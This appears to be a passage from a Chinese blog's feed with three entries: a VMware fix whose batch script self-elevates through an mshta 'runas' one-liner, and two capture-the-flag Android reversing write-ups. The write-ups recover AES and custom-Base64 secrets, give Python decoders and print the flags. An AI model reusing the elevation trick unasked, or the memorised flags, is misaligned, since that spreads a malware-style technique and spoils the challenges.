    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>最近有时候打开 VM 虚拟机时，会弹出：<code>未能开启“xxx(虚拟机路径)\xxx(虚拟机名).vmx”</code> 的警告，导致虚拟机无法正常开机</p></blockquote><p><img src="https://s2.loli.net/2023/04/11/kADdNj5BGg6MRUJ.png" alt="VM虚拟机未能开启解决办法1.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>产生原因是 VMware 的服务出现问题，需要重新启动服务，VM 即可恢复正常</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="手动修改"><a href="#手动修改" class="headerlink" title="手动修改"></a>手动修改</h3><ol><li><p>打开服务，可先通过 <code>ctrl + alt + delete</code> 打开任务管理器，在左侧栏选中服务<br><img src="https://s2.loli.net/2023/04/11/CujAOlwSoQGndIM.png" alt="VM虚拟机未能开启解决办法2.png"></p></li><li><p>往下翻，找到名称为 <code>VMAuthdService</code> 的服务</p></li><li><p>右键，重新启动<br><img src="https://s2.loli.net/2023/04/11/RWkXZafwSqsObcD.png" alt="VM虚拟机未能开启解决办法3.png"></p></li><li><p>再次打开 VM 中的虚拟机，发现问题解决，不会报错了</p></li></ol><hr><h3 id="脚本修改"><a href="#脚本修改" class="headerlink" title="脚本修改"></a>脚本修改</h3><blockquote><p>每次都手动去重新启动服务未免太麻烦，这里利用脚本自动重启</p></blockquote><ol><li><p>首先新建一个 txt 文本文件，例如：VM.txt</p></li><li><p>写入如下内容：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>其中 <code>@echo on</code> 表示 cmd 命令回显，后面两条命令用来停止和开启 <code>VMAuthdService 服务</code>，<code>pause</code> 表示命令执行完后不关闭 cmd 窗口</p></li><li><p><del>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code> 双击执行</del>，但是这样的话，运行会出错，因为需要有管理员权限</p></li><li><p>在 VM.txt 最前面加上一段代码：（<em>这段代码用来调用管理员权限</em>）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>所以，最终代码应该是这样的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span>@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code>，双击即可运行：（<em>会自动跳出询问管理员权限的窗口，点击 “是” 即可</em>）<br><img src="https://s2.loli.net/2023/04/17/vKYIJ9cNqatuGCX.png" alt="VM虚拟机未能开启解决办法4.png"></p></li><li><p>以后 VM 再出现这个报错，直接双击 <code>VM.bat</code> 即可</p></li></ol>]]></content>
    
    
    <summary type="html">打开 VMware 虚拟机时突然显示 “未能开启 xxx.vmx” ，致使虚拟机无法开机的解决办法</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>2023湖北省第七届楚慧杯-Level_up</title>
    <link href="https://www.4ss1du0us.cn/2023/03cc49f762.html"/>
    <id>https://www.4ss1du0us.cn/2023/03cc49f762.html</id>
    <published>2023-03-31T14:43:39.000Z</published>
    <updated>2023-05-11T13:05:57.451Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>当给出的 apk 中缺失某个关键函数时，有可能藏在源文件里头，并没有打包到 apk 中</mark></p></li><li><p>涉及到 AES 编码时，例如 <mark>AES128 的解密用到字节编码，最好是使用 python 脚本进行解密</mark></p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）2023湖北省第七届楚慧杯-Level_up</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到 chall 文件夹：<br><img src="https://s2.loli.net/2023/03/31/obLZrSqEaC5VXyw.png" alt="湖北省第七届楚慧杯-Level_up1.png"></p><p>注意文件夹里的内容，<code>chall.apk</code> 是打包好的安卓程序，<code>chall</code> 是 <code>chall.apk</code> 的源文件，<code>chall.apk.cache</code> 是缓存文件（具体干什么用的不太清楚）</p></li><li><p>用 jadx-gui 打开 chall.apk，定位到 <code>MainActivity</code><br><img src="https://s2.loli.net/2023/03/31/HZwzfCWhduXvjNs.png" alt="湖北省第七届楚慧杯-Level_up2.png"><br>注意到关键判断语句：<br><img src="https://s2.loli.net/2023/03/31/CGex3bQrcHVNMZg.png" alt="湖北省第七届楚慧杯-Level_up3.png"><br>将用户的输入、用户输入的长度作为参数，经过 <code>check()</code> 函数进行处理，如果校验成功就显示 right!!!</p></li><li><p>点击 <code>check()</code> 函数，发现程序里只有 <code>check()</code> 函数的声明，却没有函数的内容：<br><img src="https://s2.loli.net/2023/03/31/ItB72abQPwEjunM.png" alt="湖北省第七届楚慧杯-Level_up4.png"><br>在程序中搜索 check 关键字依然一无所获</p></li><li><p>然后比赛的时候进行到这里，我就一直卡在从程序中寻找 <code>check()</code> 函数的逻辑 【有一部分原因可能也是受了前面一道题 <code>Level_One</code> 的影响，以为校验逻辑就在程序里】</p></li></ol><blockquote><p>后来看了其他队伍【丝绒Velvet】的 Writeup 我才恍然大悟<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDkyOTgxMg==&mid=2247483701&idx=1&sn=df4e34e48671c9edf3372308df7f1269&chksm=cec80acef9bf83d83a938775e57b55c948428c0849a15c5ec0ca420ae5bad03dc58683c0dcc6&mpshare=1&scene=23&srcid=0330grQBOEkM9P3KELybR5rm&sharer_sharetime=1680167468020&sharer_shareid=bd8cb5598a8e94f9f2d58edb9b65a190#rd">2023湖北省第七届“楚慧杯”网络空间安全实践能力竞赛-预赛 -丝绒WP</a><br>   既然程序里没有这个函数，有没有可能是出题人故意在编译程序时把这个函数的内容给删了，所以 apk 文件里没有<br>   现在想想才知道为什么题目还给出了一个源文件夹 chall</p></blockquote><ol start="5"><li><p>在 <code>chall</code> 文件夹内查看：<br><img src="https://s2.loli.net/2023/03/31/9NWDIgVPHGzwlix.png" alt="湖北省第七届楚慧杯-Level_up5.png"><br><mark>通过与 jadx-gui 反编译出来的内容进行比对，发现后面这几个文件都是在程序中存在的<br>只有这个 lib 文件夹中的内容在程序中没有包含</mark></p></li><li><p>查看 <code>lib</code> 的内容：<br><img src="https://s2.loli.net/2023/03/31/ZLM8ECVwWcNreSK.png" alt="湖北省第七届楚慧杯-Level_up6.png"><br>发现这四个文件夹里各有一个文件名为 <code>libmobile2.so</code> 的文件<br><img src="https://s2.loli.net/2023/03/31/QFDCo4rXl9BsYv8.png" alt="湖北省第七届楚慧杯-Level_up7.png"><br>但是在第一个文件 <code>arm64-v8a</code> 内，是这样的：<br><img src="https://s2.loli.net/2023/04/01/k1pwrPZCdKLNIAM.png" alt="湖北省第七届楚慧杯-Level_up8.png"><br>注意到除 <code>libmobile2.so</code> 外其他文件的后缀，<code>.id0</code>、<code>.id1</code>、<code>.id2</code> 这不就是 IDA 留下的数据库文件吗<br>在 exeinfo PE 中看看：<br><img src="https://s2.loli.net/2023/04/01/ynMVQOGhwIX1aRA.png" alt="湖北省第七届楚慧杯-Level_up9.png"><br>64 位 elf 文件，用 IDA 打开，选择直接打开现存的数据库文件：<br>在函数中搜索 <code>main</code>，定位到主函数<br><img src="https://s2.loli.net/2023/04/01/9LbTBqpQNW8MdEc.png" alt="湖北省第七届楚慧杯-Level_up10.png"><br>查看一下字符串，<code>shift + F12</code>，发现端倪：<br><img src="https://s2.loli.net/2023/04/01/qzMK6RLCUIfoaiP.png" alt="湖北省第七届楚慧杯-Level_up11.png"><br>跟进 <code>gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc</code> 所在地址：<br><img src="https://s2.loli.net/2023/04/01/9hKndwE1F8u2k3P.png" alt="湖北省第七届楚慧杯-Level_up12.png"><br>发现他们定义在 <code>start()</code> 函数中<br>根据形式，函数 <code>std::string::basic_string&lt;decltype(nullptr)&gt;</code> 应该是字符串复制操作<br><code>key = &quot;followyourheart!&quot;</code><br><code>enc = &quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</code><br>得到了 main() 函数中的密文 <code>enc</code>，还得到了一个 <code>key</code> 应该是某种加密的密钥<br>同时，还注意到字符串中有 Base64 加密的码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>但是 Base64 本身是不需要密钥的，猜测可能有多种加密方法</p></li><li><p>继续审计 main() 函数：<br>很明显注意到这里有一个加密函数：<br><img src="https://s2.loli.net/2023/04/01/tvW4k3pRlGgsOfC.png" alt="湖北省第七届楚慧杯-Level_up13.png"><br>跟进，到 <code>encode()</code> 函数：<br><img src="https://s2.loli.net/2023/04/01/DGA7gqtByUVOsn9.png" alt="湖北省第七届楚慧杯-Level_up14.png"><br>加密方式已经告知了，一个 AES128，一个 Base64，结合前面观察到的字符串，大体已经可以确定了</p></li><li><p><mark>由于在 main() 函数中，发现 <code>cipher::Encrypt::encode()</code> 之后虽然有一大堆代码，但是并没有改变 <code>enc</code> 的值</mark><br>根据代码的意思，加密流程是先对明文进行 <code>AES128（ECB）</code> 加密（密钥是 <code>followyourheart!</code>），然后进行 <code>Base64</code> 加密，得到密文 <code>enc</code><br>因此先对 <code>enc</code> 进行 <code>Base64</code> 解码，然后进行 <code>AES128（ECB）</code> 解码，即可得到 flag</p></li><li><p>但是注意，<code>AES128</code> 是按照 16字节（128 bit）为一组进行加密，所以这里要对字节进行操作，使用普通的在线网站进行解密是不行的，例如：<br><img src="https://s2.loli.net/2023/04/01/gXs7iL9RIbArUBC.png" alt="湖北省第七届楚慧杯-Level_up15.png"></p></li><li><p>因此，利用 python 脚本进行解码</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES    enc <span class="token operator">=</span> <span class="token string">b'gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc'</span>  key <span class="token operator">=</span> <span class="token string">b'followyourheart!'</span>    string1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>  <span class="token comment"># 先对enc进行Base64解密  </span>  string2 <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建一个AES对象string2，根据题意是ECB加密模式  </span>flag <span class="token operator">=</span> string2<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>string1<span class="token punctuation">)</span>  <span class="token comment"># AES128 ECB解密  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/PN6AYi8G2zBoVL7.png" alt="湖北省第七届楚慧杯-Level_up16.png"></p>]]></content>
    
    
    <summary type="html">一道 200 分的安卓逆向，apk 里面没有加密的函数 check，比赛时害得我找了好久都找不到，后来看其他队伍的 WP 才发现还藏了个 so 文件，安卓了解的不是很多，后来才知道 so 文件的作用，不过还是挺好的一道题</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>2023湖北省第七届楚慧杯-Level_One</title>
    <link href="https://www.4ss1du0us.cn/2023/03b1176c40.html"/>
    <id>https://www.4ss1du0us.cn/2023/03b1176c40.html</id>
    <published>2023-03-30T08:35:24.000Z</published>
    <updated>2023-05-11T05:23:37.543Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>安卓逆向如何获取数据资源</mark></p></li><li><p><mark>更换码表的 Base64</mark> 加解密</p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）2023湖北省第七届楚慧杯-Level_One</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到一个 chall.apk 文件<br><img src="https://s2.loli.net/2023/03/30/tdgwkYnR6A4Jeq9.png" alt="2022第七届楚慧杯-Level_One1.png"><br>界面是常规的输入 flag 然后进行校验，没什么特别的</p></li><li><p>在 jadx-gui 中打开，找到 <code>MainActivity</code>：<br><img src="https://s2.loli.net/2023/03/30/74TvB9dUx6ONicj.png" alt="2022第七届楚慧杯-Level_One2.png"></p></li><li><p>定位到关键判断语句：<br><img src="https://s2.loli.net/2023/03/30/rGkJRD9g3fFNBe4.png" alt="2022第七届楚慧杯-Level_One3.png"></p></li><li><p>获取用户输入，并转化为 utf-8 编码，以字节形式调用 <code>Encrypt()</code> 函数进行加密，然后与 <code>C0535R.string.enc</code> 进行比较，如果相同则获得 flag</p></li><li><p><code>Encrypt()</code> 函数的内容在下方给出：<br><img src="https://s2.loli.net/2023/03/30/YbdJGi2gXl3H5sA.png" alt="2022第七届楚慧杯-Level_One4.png"></p></li><li><p>形式看起来比较复杂，但是可以注意到代码后面一段：<br><img src="https://s2.loli.net/2023/03/30/wUqIcAZ5zoHMsyp.png" alt="2022第七届楚慧杯-Level_One5.png"><br>这里对 <code>bArr</code> 的长度做了一个余 3 的操作，余数为 <code>length2</code><br>并且，还对余数的两种情况分别进行了讨论：<br>当 <code>length2 = 1</code> 时，会在最后添加 <code>&quot;%&amp;&quot;</code><br>当 <code>length2 = 2</code> 时，会在最后添加 <code>&quot;*&quot;</code><br>同时，java 中 <code>charAt()</code> 方法用于返回字符串中指定索引位置的字符，这里利用 <code>append()</code> 向 <code>sb</code> 插入索引处的值<br>这样的特点非常类似 Base64 加密算法，但是不同的是：<br>这里根据余数为 <code>1</code> 或 <code>2</code> 添加的不是 <code>&quot;==&quot;</code> 和 <code>&quot;=&quot;</code></p></li><li><p>继续观察，可以发现 <code>append()</code> 插入用到的索引表 <code>string</code> 来自 <code>C0535R.string.table</code><br><img src="https://s2.loli.net/2023/03/30/4mT6ZNh3yEqJSDL.png" alt="2022第七届楚慧杯-Level_One6.png"></p></li><li><p>在资源中定位这个文件：<br><img src="https://s2.loli.net/2023/03/30/XFeruybMvQo3HxW.png" alt="2022第七届楚慧杯-Level_One7.png"><br>可以得到表中的内容：<code>n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ</code><br>包含大写字母、小写字母、数字 0-9、<code>&#39;+&#39;</code>、<code>&#39;/&#39;</code>，很符合 Base64 码表的形式，只是原始码表的顺序被打乱了<br>但是根据这里码表的变动，且多出一个 <code>&#39;=&#39;</code>，导致 <code>Encrypt()</code> 函数中最后根据余数个数添加的不是 <code>&#39;==&#39;</code> 和 <code>&#39;=&#39;</code>，也就基本可以确定 <code>Encrypt()</code> 函数是更换过码表的 Base64 加密了</p></li><li><p>在资源里找到 if 条件中对比的数据 <code>C0535R.string.enc</code>：<br><img src="https://s2.loli.net/2023/03/30/f47O5mireX16KMF.png" alt="2022第七届楚慧杯-Level_One8.png"><br>得到 <code>enc</code> 的内容：<code>UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5</code></p></li><li><p>利用更换码表的 Base64 解密即可（<strong>脚本在便捷算法里有总结</strong>）</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">## coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment">## 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment">## 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">## print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment">## 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{380605c6-7123-4f71-b573-601e8c4457b4}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/QCaV1x5PsDmiq7M.png" alt="2022第七届楚慧杯-Level_One9.png"></p>]]></content>
    
    
